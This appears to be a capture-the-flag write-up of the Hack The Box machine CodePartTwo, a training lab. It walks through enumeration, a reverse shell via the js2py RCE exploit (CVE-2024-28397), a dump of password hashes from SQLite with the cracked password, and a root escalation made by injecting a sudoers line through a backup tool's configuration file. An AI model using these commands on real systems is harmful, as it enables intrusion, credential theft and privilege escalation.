---
title: HackTheBox-CodePartTwo
description: "Step-by-step Hack The Box CodePartTwo walkthrough. Learn how to exploit js2py RCE (CVE-2024-28397), gain user access, and escalate privileges via sudo abuse."
date: 2026-02-06 12:00:00 +0000
categories: [HTB, Machine]
tags: [Linux, js2py, CVE, sudo_abuse, configuration_injection]
layout: post
permalink: /hackthebox/codeparttwo/
---

![image4.png](/assets/img/CodePartTwo/image%204.png)


# CodePartTwo

## Enumeration – Service Discovery


### Nmap Scan

We start with a basic service and version scan using Nmap.

```bash
nmap -sV -sC 10.129.11.13
```

**Result:**

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 03:42 EET
Nmap scan report for 10.129.11.13
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux
```

**Discovered services:**

* SSH on port 22
* Web application (Gunicorn) on port 8000

---

## Web Enumeration – Application Mapping

### Directory Brute Force

Since an HTTP service is available, directory enumeration is performed using `dirsearch`.

```bash
dirsearch -u http://10.129.11.13:8000 -x 404
```

**Result:**

```text
/dashboard -> /login (302)
/download  (200)
/login     (200)
/logout    -> / (302)
```

**Interesting endpoints:**

* `/dashboard`
* `/download`
* `/run_code` (discovered later during interaction)

---

## Initial Foothold – js2py Remote Code Execution

### Web Application Analysis

After registering and logging in, the dashboard exposes a JavaScript execution panel. Requests are sent to the `/run_code` endpoint.
![image3.png](/assets/img/CodePartTwo/image%203.png)

Testing the endpoint:

```bash
curl -X POST http://10.129.11.13:8000/run_code \
-H "Content-Type: application/json" \
-d '{"code": "var x = 5 + 5; x"}'
```

**Response:**

```json
{"result":10}
```

This confirms server-side JavaScript execution.

---

## Source Code Review

The application source code can be downloaded from the `/download` endpoint.

Reviewing the backend reveals that the application uses **js2py** to execute user-supplied JavaScript. This version is vulnerable to **CVE-2024-28397**, allowing remote code execution.

**Reference:**

* [https://github.com/naclapor/CVE-2024-28397](https://github.com/naclapor/CVE-2024-28397)

---

## Exploitation CVE-2024-28397 

### Reverse Shell

Set up a listener:

```bash
nc -lvnp 8888
```

Run the exploit:

```bash
python3 exploit.py \
--target http://10.129.11.13:8000/run_code \
--lhost 10.10.14.205 \
--lport 8888
```

A reverse shell is successfully received.

---

## Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## User Enumeration

During filesystem enumeration, a SQLite database is discovered:

```text
~/app/instance/users.db
```

### Database Inspection

```bash
sqlite3 users.db ".tables"
```

```text
code_snippet  user
```

Dump user credentials:

```bash
sqlite3 users.db "SELECT * FROM user;"
```

```text
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

After cracking the hash, the following password is obtained:

```text
sweetangelbabylove
```
![image1.png](/assets/img/CodePartTwo/image%201.png)
---

## SSH Access

Switch user locally or connect via SSH:

```bash
su marco
```

or

```bash
ssh marco@10.129.11.13
```

Retrieve the user flag:

```bash
cat user.txt
```

```text
a02700fa1e3e8843974152cd435b45d9
```

---

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

The user `marco` can execute `npbackup-cli` as root without a password.

---

## Configuration Abuse

Inspect the help menu:

```bash
sudo /usr/local/bin/npbackup-cli -h
```

The tool allows specifying a custom configuration file:

```text
-c, --config-file CONFIG_FILE
```

Default configuration file:

```text
/home/marco/npbackup.conf
```

Copy it to `/tmp`:

```bash
cp ~/npbackup.conf /tmp/mod.conf
```

---

## Command Execution as Root

Inside the configuration file:

```yaml
backup_opts:
  pre_exec_commands: []
```

This option allows execution of arbitrary commands as root. Modify it to append the user to `/etc/sudoers`:

```yaml
backup_opts:
  pre_exec_commands:
    - 'echo "marco ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
```

---

## Execute Backup

```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/mod.conf -backup
```

Verify privileges:

```bash
sudo -l
```

```text
(ALL) NOPASSWD: ALL
```

---

## Root Access

```bash
sudo -i
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
fc15060ea343186abd075822c704159e
```

---

## Summary

* **Initial Access:** js2py RCE (CVE-2024-28397)
* **User Escalation:** SQLite credential reuse
* **Privilege Escalation:** Misconfigured `npbackup-cli` allowing root command execution
* **Difficulty:** Easy
* **Techniques:** RCE, password cracking, sudo abuse, configuration injection
